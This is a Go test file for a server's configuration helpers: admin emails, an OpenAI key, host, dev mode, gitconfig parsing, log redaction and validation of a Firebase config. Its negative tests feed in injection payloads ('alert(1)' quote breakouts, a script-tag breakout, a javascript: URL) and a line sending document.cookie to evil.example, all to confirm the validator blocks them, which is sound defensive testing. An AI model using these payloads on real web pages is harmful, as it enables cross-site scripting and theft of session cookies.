package utils

import (
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

// settings isolates a test from the real environment and file settings.
func settings(t *testing.T, env map[string]string, file map[string]string) {
	t.Helper()
	savedFile, savedPath := GitConfig, GitConfigPath
	saved := map[string]*string{}
	for _, name := range []string{EnvMode, EnvAdminEmails, EnvOpenAIKey, EnvHost, EnvFirebaseConfig} {
		if v, ok := os.LookupEnv(name); ok {
			v := v
			saved[name] = &v
		} else {
			saved[name] = nil
		}
		os.Unsetenv(name)
	}
	for name, v := range env {
		os.Setenv(name, v)
	}
	GitConfig = file
	if GitConfig == nil {
		GitConfig = map[string]string{}
	}
	GitConfigPath = ""
	t.Cleanup(func() {
		GitConfig, GitConfigPath = savedFile, savedPath
		for name, v := range saved {
			if v == nil {
				os.Unsetenv(name)
			} else {
				os.Setenv(name, *v)
			}
		}
	})
}

func TestAdminEmailsComeFromTheEnvironmentFirstAndTheFileAfter(t *testing.T) {
	file := map[string]string{"user.email": "file@example.com"}

	settings(t, nil, file)
	if got := AdminEmails(); !reflect.DeepEqual(got, []string{"file@example.com"}) {
		t.Fatalf("file only: %v", got)
	}

	settings(t, map[string]string{EnvAdminEmails: " Alice@Example.com, bob@example.com ,, "}, file)
	if got := AdminEmails(); !reflect.DeepEqual(got, []string{"Alice@Example.com", "bob@example.com"}) {
		t.Fatalf("the environment must win, split on commas, and drop blanks: %v", got)
	}

	// An empty variable, as in a .env that was copied from the example and
	// not filled in, does not switch the file off.
	settings(t, map[string]string{EnvAdminEmails: "  "}, file)
	if got := AdminEmails(); !reflect.DeepEqual(got, []string{"file@example.com"}) {
		t.Fatalf("a blank variable must count as not set: %v", got)
	}

	settings(t, nil, nil)
	if got := AdminEmails(); len(got) != 0 {
		t.Fatalf("nothing configured: %v", got)
	}
}

func TestNobodyIsAnAdminWithoutAConfiguredAdmin(t *testing.T) {
	settings(t, nil, nil)
	for _, email := range []string{"", " ", "anyone@example.com", "admin@example.com"} {
		if IsAdminEmail(email) {
			t.Errorf("%q is an admin although none is configured", email)
		}
	}
	// A file that sets an empty email configures nobody either.
	settings(t, nil, map[string]string{"user.email": "  "})
	if IsAdminEmail("") || IsAdminEmail("x@example.com") {
		t.Error("an empty user.email made someone an admin")
	}
}

func TestIsAdminEmail(t *testing.T) {
	settings(t, map[string]string{EnvAdminEmails: "alice@example.com, bob@example.com"}, nil)
	for _, c := range []struct {
		email string
		want  bool
	}{
		{"alice@example.com", true},
		{"ALICE@Example.COM", true}, // email addresses are not case-sensitive
		{" bob@example.com ", true},
		{"carol@example.com", false},
		{"lice@example.com", false}, // a part of an address is not a match
		{"alice@example.com.evil.net", false},
		{"", false},
	} {
		if got := IsAdminEmail(c.email); got != c.want {
			t.Errorf("IsAdminEmail(%q) = %v, want %v", c.email, got, c.want)
		}
	}
}

func TestOpenAIKey(t *testing.T) {
	legacy := map[string]string{"user.OpenaiAPIKey": base64.StdEncoding.EncodeToString([]byte("sk-from-file\n"))}

	settings(t, nil, legacy)
	if got := OpenAIKey(); got != "sk-from-file" {
		t.Fatalf("the file's base64 key: %q", got)
	}
	settings(t, map[string]string{EnvOpenAIKey: " sk-from-env\n"}, legacy)
	if got := OpenAIKey(); got != "sk-from-env" {
		t.Fatalf("the environment's key is used as it is and wins: %q", got)
	}
	settings(t, nil, map[string]string{"user.OpenaiAPIKey": "not base64 !!"})
	if got := OpenAIKey(); got != "" {
		t.Fatalf("an invalid file key must give no key: %q", got)
	}
	settings(t, nil, nil)
	if got := OpenAIKey(); got != "" {
		t.Fatalf("no key: %q", got)
	}
}

func TestHost(t *testing.T) {
	settings(t, nil, map[string]string{"user.host": "file.example.com"})
	if got := Host(); got != "file.example.com" {
		t.Fatalf("file: %q", got)
	}
	settings(t, map[string]string{EnvHost: " env.example.com "}, map[string]string{"user.host": "file.example.com"})
	if got := Host(); got != "env.example.com" {
		t.Fatalf("env: %q", got)
	}
	settings(t, nil, nil)
	if got := Host(); got != "" {
		t.Fatalf("unset: %q", got)
	}
}

func TestOnlyDevModeIsDev(t *testing.T) {
	for value, want := range map[string]bool{
		"dev": true, "DEV": true, " development ": true, "local": true,
		"": false, "production": false, "prod": false, "true": false, "1": false, "devel": false,
	} {
		settings(t, map[string]string{EnvMode: value}, nil)
		if got := IsDev(); got != want {
			t.Errorf("OPENREPL_ENV=%q: IsDev = %v, want %v", value, got, want)
		}
	}
	settings(t, nil, nil)
	if IsDev() {
		t.Error("with OPENREPL_ENV unset the server must be in production mode")
	}
}

func TestTheHomeDirectoryIsExpandedForTheFileFallback(t *testing.T) {
	files := gitConfigFiles("/home/someone")
	want := []string{"/opt/gotty/.gitconfig", "/home/someone/.gitconfig", "/etc/.gitconfig"}
	if !reflect.DeepEqual(files, want) {
		t.Fatalf("files = %v, want %v", files, want)
	}
	for _, f := range gitConfigFiles("") {
		if strings.Contains(f, "~") {
			t.Fatalf("%q still has a ~", f)
		}
	}
	if got := gitConfigFiles(""); len(got) != 2 {
		t.Fatalf("without a home directory there is no home entry: %v", got)
	}

	// And the file there is really read, which it never was with the literal "~/".
	home, err := ioutil.TempDir("", "home")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(home)
	if err := ioutil.WriteFile(filepath.Join(home, ".gitconfig"), []byte("[user]\n\temail = home@example.com\n"), 0600); err != nil {
		t.Fatal(err)
	}
	got, path := readGitConfig(gitConfigFiles(home)[1:2])
	if got["user.email"] != "home@example.com" || path != filepath.Join(home, ".gitconfig") {
		t.Fatalf("read %v from %q", got, path)
	}
}

func TestReadGitConfigUsesTheFirstFileThatExists(t *testing.T) {
	dir, err := ioutil.TempDir("", "cfg")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(dir)
	write := func(name, body string) string {
		p := filepath.Join(dir, name)
		if err := ioutil.WriteFile(p, []byte(body), 0600); err != nil {
			t.Fatal(err)
		}
		return p
	}
	second := write("second", "[user]\n email = second@example.com\n")
	third := write("third", "[user]\n email = third@example.com\n")

	got, path := readGitConfig([]string{filepath.Join(dir, "missing"), second, third})
	if path != second || got["user.email"] != "second@example.com" {
		t.Fatalf("read %v from %q, want the second file only", got, path)
	}
	got, path = readGitConfig([]string{filepath.Join(dir, "missing")})
	if path != "" || len(got) != 0 {
		t.Fatalf("nothing to read: %v from %q", got, path)
	}
}

func TestParseGitConfig(t *testing.T) {
	got := parseGitConfig([]byte(`
# a comment
[user]
	email = a@example.com
	OpenaiAPIKey = c2stYWJj
[user "extra"]
	name = Extra Person
[core]
	key = a = b
loose line without a section value
`))
	want := map[string]string{
		"user.email":        "a@example.com",
		"user.OpenaiAPIKey": "c2stYWJj",
		"user.extra.name":   "Extra Person",
		"core.key":          "a = b",
	}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("got %v\nwant %v", got, want)
	}
}

func TestProductionLogsNeverShowAValue(t *testing.T) {
	settings(t, map[string]string{
		EnvAdminEmails: "alice@example.com,bob@example.com",
		EnvOpenAIKey:   "sk-secret-key",
		EnvHost:        "openrepl.example.com",
	}, nil)
	GitConfigPath = "/opt/gotty/.gitconfig"
	got := configSummary(IsDev())
	for _, secret := range []string{"alice@example.com", "bob@example.com", "sk-secret-key", "openrepl.example.com"} {
		if strings.Contains(got, secret) {
			t.Fatalf("the production summary shows %q: %s", secret, got)
		}
	}
	for _, want := range []string{"mode=production", "file=/opt/gotty/.gitconfig", "admin emails: set, 2 (from env)", "openai key: set (from env)", "host: set (from env)"} {
		if !strings.Contains(got, want) {
			t.Errorf("the summary lacks %q: %s", want, got)
		}
	}
	if strings.Contains(got, "nobody is an admin") {
		t.Errorf("an admin is configured: %s", got)
	}
}

func TestDevLogsShowTheValues(t *testing.T) {
	settings(t, map[string]string{
		EnvMode:        "dev",
		EnvAdminEmails: "alice@example.com",
		EnvOpenAIKey:   "sk-dev-key",
	}, map[string]string{"user.host": "localhost"})
	got := configSummary(IsDev())
	for _, want := range []string{"mode=dev", "alice@example.com (from env)", "sk-dev-key (from env)", "localhost (from file)", "file=none"} {
		if !strings.Contains(got, want) {
			t.Errorf("the dev summary lacks %q: %s", want, got)
		}
	}
}

func TestSummaryWarnsWhenNobodyIsAnAdminAndSaysWhatIsNotSet(t *testing.T) {
	settings(t, nil, nil)
	got := configSummary(false)
	for _, want := range []string{"admin emails: not set", "openai key: not set", "host: not set", "nobody is an admin", "file=none"} {
		if !strings.Contains(got, want) {
			t.Errorf("the summary lacks %q: %s", want, got)
		}
	}
}

const devFirebase = `{"apiKey":"AIzaSyDevKey1234567890","authDomain":"my-dev.firebaseapp.com","projectId":"my-dev-project","databaseURL":"https://my-dev-project-default-rtdb.firebaseio.com","appId":"1:1234567890:web:abcdef","somethingElse":"ignored"}`

func TestFirebaseConfigIsUnsetByDefault(t *testing.T) {
	settings(t, nil, nil)
	if cfg, set, err := FirebaseConfigFromEnv(); cfg != nil || set || err != nil {
		t.Fatalf("%v %v %v", cfg, set, err)
	}
	if _, ok := FirebaseConfigJS(); ok {
		t.Fatal("the script is offered although nothing is set")
	}
	settings(t, map[string]string{EnvFirebaseConfig: "  "}, nil)
	if _, set, _ := FirebaseConfigFromEnv(); set {
		t.Fatal("a blank variable must count as not set")
	}
}

func TestFirebaseConfigFromJSONAndFromBase64(t *testing.T) {
	want := map[string]string{
		"apiKey":      "AIzaSyDevKey1234567890",
		"authDomain":  "my-dev.firebaseapp.com",
		"projectId":   "my-dev-project",
		"databaseURL": "https://my-dev-project-default-rtdb.firebaseio.com",
		"appId":       "1:1234567890:web:abcdef",
	}
	for name, value := range map[string]string{
		"json":   devFirebase,
		"base64": base64.StdEncoding.EncodeToString([]byte(devFirebase)),
		"padded": "  " + devFirebase + "\n",
	} {
		settings(t, map[string]string{EnvFirebaseConfig: value}, nil)
		cfg, set, err := FirebaseConfigFromEnv()
		if err != nil || !set || !reflect.DeepEqual(cfg, want) {
			t.Errorf("%s: %v %v %v\nwant %v", name, cfg, set, err, want)
		}
	}
}

func TestFirebaseConfigScriptDefinesWhatThePageExpects(t *testing.T) {
	settings(t, map[string]string{EnvFirebaseConfig: devFirebase}, nil)
	js, ok := FirebaseConfigJS()
	if !ok {
		t.Fatal("no script")
	}
	s := string(js)
	if !strings.HasPrefix(strings.TrimSpace(s), "const firebaseconfig = {") || !strings.HasSuffix(strings.TrimSpace(s), "};") {
		t.Fatalf("script = %q", s)
	}
	body := strings.TrimSuffix(strings.TrimPrefix(strings.TrimSpace(s), "const firebaseconfig = "), ";")
	var back map[string]string
	if err := json.Unmarshal([]byte(body), &back); err != nil || back["projectId"] != "my-dev-project" {
		t.Fatalf("the object is not the config: %v %v", back, err)
	}
	if strings.Contains(s, "somethingElse") {
		t.Fatal("a field that is not part of a web app config was passed on")
	}
}

func TestFirebaseConfigMistakesAreErrorsThatDoNotRepeatTheValue(t *testing.T) {
	good := func(mod func(m map[string]interface{})) string {
		m := map[string]interface{}{
			"apiKey": "AIzaSyDevKey1234567890", "authDomain": "my-dev.firebaseapp.com", "projectId": "my-dev-project",
		}
		mod(m)
		b, _ := json.Marshal(m)
		return string(b)
	}
	for name, c := range map[string]struct{ value, wantInError string }{
		"not json":            {"{oops", "not valid JSON"},
		"not base64 either":   {"%%%not-base64%%%", "base64"},
		"json of an array":    {"[1,2]", "base64"},
		"missing project id":  {good(func(m map[string]interface{}) { delete(m, "projectId") }), "projectId"},
		"missing two":         {good(func(m map[string]interface{}) { delete(m, "projectId"); delete(m, "apiKey") }), "apiKey, projectId"},
		"number as a value":   {good(func(m map[string]interface{}) { m["apiKey"] = 12345678 }), "must be a string"},
		"api key with quote":  {good(func(m map[string]interface{}) { m["apiKey"] = `abc"};alert(1);//` }), "apiKey"},
		"api key too short":   {good(func(m map[string]interface{}) { m["apiKey"] = "abc" }), "apiKey"},
		"domain with scheme":  {good(func(m map[string]interface{}) { m["authDomain"] = "https://my-dev.firebaseapp.com" }), "authDomain"},
		"domain with path":    {good(func(m map[string]interface{}) { m["authDomain"] = "my-dev.firebaseapp.com/x" }), "authDomain"},
		"domain with quote":   {good(func(m map[string]interface{}) { m["authDomain"] = `a.com"};alert(1)` }), "authDomain"},
		"project id in caps":  {good(func(m map[string]interface{}) { m["projectId"] = "My_Project" }), "projectId"},
		"database over http":  {good(func(m map[string]interface{}) { m["databaseURL"] = "http://evil.example.com" }), "databaseURL"},
		"database script url": {good(func(m map[string]interface{}) { m["databaseURL"] = "javascript:alert(1)" }), "databaseURL"},
		"database with quote": {good(func(m map[string]interface{}) { m["databaseURL"] = `https://x.com"};alert(1);//` }), "databaseURL"},
		"app id with space":   {good(func(m map[string]interface{}) { m["appId"] = "1 2" }), "appId"},
	} {
		settings(t, map[string]string{EnvFirebaseConfig: c.value}, nil)
		cfg, set, err := FirebaseConfigFromEnv()
		if err == nil || cfg != nil || !set {
			t.Errorf("%s: accepted (%v, %v, %v)", name, cfg, set, err)
			continue
		}
		if !strings.Contains(err.Error(), c.wantInError) {
			t.Errorf("%s: error %q should mention %q", name, err, c.wantInError)
		}
		for _, secret := range []string{"AIzaSyDevKey1234567890", "alert(1)", "evil.example.com"} {
			if strings.Contains(err.Error(), secret) {
				t.Errorf("%s: the error repeats a value: %v", name, err)
			}
		}
		if _, ok := FirebaseConfigJS(); ok {
			t.Errorf("%s: a script is offered for an invalid config", name)
		}
	}
}

func TestFirebaseConfigAcceptsAnEmulatorStyleDatabaseURL(t *testing.T) {
	for _, url := range []string{
		"http://localhost:9000?ns=my-dev-project",
		"http://127.0.0.1:9000/?ns=my-dev-project",
		"https://my-dev-project-default-rtdb.europe-west1.firebasedatabase.app",
	} {
		settings(t, map[string]string{EnvFirebaseConfig: `{"apiKey":"fake-api-key","authDomain":"localhost","projectId":"my-dev-project","databaseURL":"` + url + `"}`}, nil)
		if _, _, err := FirebaseConfigFromEnv(); err != nil {
			t.Errorf("%s: %v", url, err)
		}
	}
}

func TestSummaryFirebase(t *testing.T) {
	settings(t, nil, nil)
	if got := configSummary(false); !strings.Contains(got, "firebase: the built-in project") || strings.Contains(got, "production one") {
		t.Errorf("production, unset: %s", got)
	}
	if got := configSummary(true); !strings.Contains(got, "the production one") || !strings.Contains(got, EnvFirebaseConfig) {
		t.Errorf("dev, unset should say that this is the production project: %s", got)
	}

	settings(t, map[string]string{EnvFirebaseConfig: devFirebase}, nil)
	prod := configSummary(false)
	for _, secret := range []string{"AIzaSyDevKey1234567890", "my-dev-project", "my-dev.firebaseapp.com"} {
		if strings.Contains(prod, secret) {
			t.Errorf("the production summary shows %q: %s", secret, prod)
		}
	}
	if !strings.Contains(prod, "firebase: custom project (from env)") {
		t.Errorf("production, set: %s", prod)
	}
	if dev := configSummary(true); !strings.Contains(dev, `"projectId":"my-dev-project"`) {
		t.Errorf("dev should show the config: %s", dev)
	}

	settings(t, map[string]string{EnvFirebaseConfig: "{oops"}, nil)
	if got := configSummary(false); !strings.Contains(got, "firebase: INVALID") {
		t.Errorf("invalid: %s", got)
	}
}

// What the Firebase console shows, and the shape the server's own built-in
// config is kept in (base64 of this).
const consoleSnippet = `// Import the functions you need from the SDKs you need
import { initializeApp } from "firebase/app";
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyDevKey1234567890",
  authDomain: "my-dev.firebaseapp.com",
  databaseURL: 'https://my-dev-project-default-rtdb.firebaseio.com',
  projectId: "my-dev-project",
  storageBucket: "my-dev.appspot.com",
  messagingSenderId: "123456789012",
  appId: "1:123456789012:web:abcdef123456",
  measurementId: "G-ABC123XYZ",
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);`

const builtinStyle = "\nconst firebaseconfig = {\n  apiKey: \"AIzaSyDevKey1234567890\",\n  authDomain: \"my-dev.firebaseapp.com\",\n  projectId: \"my-dev-project\",\n  databaseURL: \"https://my-dev-project-default-rtdb.firebaseio.com\"\n};\n\n"

func TestFirebaseConfigFromTheSnippetTheConsoleShows(t *testing.T) {
	want := map[string]string{
		"apiKey":            "AIzaSyDevKey1234567890",
		"authDomain":        "my-dev.firebaseapp.com",
		"databaseURL":       "https://my-dev-project-default-rtdb.firebaseio.com",
		"projectId":         "my-dev-project",
		"storageBucket":     "my-dev.appspot.com",
		"messagingSenderId": "123456789012",
		"appId":             "1:123456789012:web:abcdef123456",
		"measurementId":     "G-ABC123XYZ",
	}
	for name, value := range map[string]string{
		"raw":             consoleSnippet,
		"base64":          base64.StdEncoding.EncodeToString([]byte(consoleSnippet)),
		"just the object": consoleSnippet[strings.Index(consoleSnippet, "{\n  apiKey") : strings.Index(consoleSnippet, "};")+1],
	} {
		settings(t, map[string]string{EnvFirebaseConfig: value}, nil)
		cfg, set, err := FirebaseConfigFromEnv()
		if err != nil || !set || !reflect.DeepEqual(cfg, want) {
			t.Errorf("%s: %v %v %v", name, cfg, set, err)
		}
	}
}

// The built-in config is base64 of a snippet, and the same text is accepted
// from the environment.
func TestFirebaseConfigInTheFormatOfTheBuiltInOne(t *testing.T) {
	settings(t, map[string]string{EnvFirebaseConfig: base64.StdEncoding.EncodeToString([]byte(builtinStyle))}, nil)
	cfg, set, err := FirebaseConfigFromEnv()
	if err != nil || !set || cfg["projectId"] != "my-dev-project" || cfg["apiKey"] != "AIzaSyDevKey1234567890" ||
		cfg["databaseURL"] != "https://my-dev-project-default-rtdb.firebaseio.com" || len(cfg) != 4 {
		t.Fatalf("%v %v %v", cfg, set, err)
	}
	js, ok := FirebaseConfigJS()
	if !ok || !strings.Contains(string(js), `"projectId": "my-dev-project"`) {
		t.Fatalf("%v %s", ok, js)
	}
}

func TestFirebaseSnippetCannotCarryAnythingIntoThePage(t *testing.T) {
	for name, snippet := range map[string]string{
		"escaped quote":               `const c = { apiKey: "abc\"};alert(1);//", authDomain: "a.firebaseapp.com", projectId: "my-dev-project" };`,
		"script in a value":           `const c = { apiKey: "AIzaSyDevKey1234567890", authDomain: "a.firebaseapp.com", projectId: "my-dev-project", databaseURL: "https://x.com/</script><script>alert(1)" };`,
		"code after":                  `const c = { apiKey: "AIzaSyDevKey1234567890", authDomain: "a.firebaseapp.com", projectId: "my-dev-project" }; fetch("https://evil.example/" + document.cookie);`,
		"only one key given":          `const c = { apiKey: "AIzaSyDevKey1234567890" };`,
		"values that are not strings": `const c = { apiKey: 123456789012, authDomain: null, projectId: true };`,
	} {
		settings(t, map[string]string{EnvFirebaseConfig: snippet}, nil)
		cfg, _, err := FirebaseConfigFromEnv()
		if name == "code after" {
			// the valid fields are read; nothing else in the text is carried over
			if err != nil {
				t.Errorf("%s: %v", name, err)
				continue
			}
			js, _ := FirebaseConfigJS()
			if strings.Contains(string(js), "evil") || strings.Contains(string(js), "fetch") || strings.Contains(string(js), "document.cookie") {
				t.Errorf("%s: code from the value reached the script: %s", name, js)
			}
			continue
		}
		if err == nil {
			t.Errorf("%s: accepted %v", name, cfg)
			continue
		}
		if strings.Contains(err.Error(), "alert(1)") || strings.Contains(err.Error(), "AIzaSyDevKey1234567890") {
			t.Errorf("%s: the error repeats a value: %v", name, err)
		}
	}
}
